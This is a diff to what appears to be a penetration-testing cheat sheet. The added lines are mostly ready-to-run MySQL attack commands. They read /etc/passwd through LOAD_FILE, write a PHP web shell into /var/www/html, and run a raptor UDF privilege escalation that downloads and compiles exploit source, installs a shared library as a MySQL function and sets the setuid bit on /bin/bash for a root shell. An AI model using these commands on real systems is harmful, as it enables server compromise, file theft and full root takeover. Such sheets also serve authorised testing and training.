@@ -395,11 +395,43 @@ use <db>;
 show tables;
 select * from <table>;
 
+-- Current user and permissions
+SELECT user();
+SELECT super_priv FROM mysql.user WHERE user = current_user();
+
 -- Read files (requires FILE privilege)
 SELECT LOAD_FILE('/etc/passwd');
 
--- Write web shell (requires secure_file_priv to be empty or allow path)
+-- Write web shell (requires FILE privilege, secure_file_priv='')
 SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
+
+-- Check secure_file_priv (empty string = no restriction)
+SHOW VARIABLES LIKE 'secure_file_priv';
+```
+
+**UDF privesc (MySQL running as root → OS command execution):**
+
+```bash
+# If MySQL runs as root and you have INSERT on mysql.* — compile UDF library
+# raptor_udf.c / lib_mysqludf_sys (pre-compiled available)
+
+# On LHOST:
+wget https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+```
+
+```sql
+-- In MySQL (as root):
+-- Find plugin dir
+SHOW VARIABLES LIKE 'plugin_dir';
+-- Drop UDF lib there (use SELECT INTO DUMPFILE if FILE priv)
+SELECT binary 0x... INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
+CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
+
+-- RCE:
+SELECT do_system('chmod +s /bin/bash');
+-- Then on shell: /bin/bash -p → root
 ```
 
 ---
